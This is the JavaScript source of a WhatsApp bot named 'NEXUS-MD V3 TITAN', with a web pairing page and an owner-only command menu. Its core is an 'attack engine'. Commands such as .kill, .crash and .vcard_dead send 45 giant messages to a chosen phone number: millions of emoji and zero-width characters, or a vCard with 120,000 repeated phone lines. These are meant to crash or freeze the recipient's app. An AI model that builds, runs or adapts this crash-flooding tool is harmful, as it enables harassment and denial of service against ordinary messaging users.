const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD V3 TITAN",
    owner: "94767475809", 
    prefix: ".",
};

// --- 🌐 WEB INTERFACE FOR PAIRING (NO TELEGRAM NEEDED) ---
app.get('/', (req, res) => {
    res.send(`
        <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
            <h1 style="text-shadow: 0 0 10px #0f0;">🔱 NEXUS-MD V3 TITAN 🔱</h1>
            <p>Master: Sasiya MD | Status: <span style="color: white;">TITAN ENGINE ACTIVE</span></p>
            <hr style="border: 1px solid #333; width: 50%;">
            <div style="margin-top: 30px;">
                <input type="text" id="number" placeholder="9476xxxxxxx" style="padding: 10px; border: 1px solid #0f0; background: #000; color: #0f0;">
                <button onclick="getPairing()" style="padding: 10px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold;">GET TITAN KEY</button>
            </div>
            <h2 id="pairCode" style="margin-top: 40px; font-size: 40px; letter-spacing: 5px;"></h2>
            <script>
                async function getPairing() {
                    const num = document.getElementById('number').value;
                    if(!num) return alert('Enter Number!');
                    document.getElementById('pairCode').innerText = "CONNECTING...";
                    const res = await fetch('/pair?num=' + num);
                    const data = await res.json();
                    document.getElementById('pairCode').innerText = data.code || "ERROR!";
                }
            </script>
        </body>
    `);
});

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "22.0.04"],
        syncFullHistory: false
    });

    // --- 🔑 WEB PAIRING ENDPOINT ---
    app.get('/pair', async (req, res) => {
        let num = req.query.num;
        if (!num) return res.json({ error: "No Number" });
        try {
            let code = await sock.requestPairingCode(num.replace(/[^0-9]/g, ''));
            res.json({ code: code });
        } catch (e) {
            res.json({ error: "Try Again" });
        }
    });

    // --- ☣️ GLOBAL 8.5M TITAN PAYLOADS ---
    const p_titan = "☠️".repeat(1000000) + "​".repeat(7500000); 
    const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Titan-Nexus;;;\nFN:Titan\n" + "TEL;type=CELL;waid=94767475809:".repeat(120000) + "\nEND:VCARD"; 

    // --- 📩 TITAN ATTACK ENGINE ---
    sock.ev.on('messages.upsert', async (m) => {
        try {
            const mek = m.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            if (!from.startsWith(botConfig.owner)) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null;

            if (command === 'menu') {
                const menu = `
┏━━━━━━━━━━━━━━━━━━━━━┓
┃  🔱 *NEXUS TITAN V3* 🔱
┗━━━━━━━━━━━━━━━━━━━━━┛
┃ 🩸 *POWER:* 8.5M Stress
┃ ☠️ *.kill* [num]
┃ 🔥 *.crash* [num]
┃ 📇 *.vcard_dead* [num]
┃ 📍 *.loc_kill* [num]
┃ 🌀 *.wipe* [jid]
┗━━━━━━━━━━━━━━━━━━━━━┛`;
                await sock.sendMessage(from, { text: menu });
            }

            if (['kill', 'crash', 'vcard_dead', 'loc_kill'].includes(command)) {
                if (!target) return;
                await sock.sendMessage(from, { text: `🔱 *TITAN ATTACKING:* ${args[0]}` });
                for(let i=0; i<45; i++) {
                    let payload = command === 'vcard_dead' ? p_vcard : p_titan;
                    await sock.sendMessage(target, { text: payload });
                    await delay(80);
                }
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (u) => { if (u.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

app.listen(PORT, () => {
    console.log(`Titan Dashboard: http://localhost:${PORT}`);
    startNexus();
});
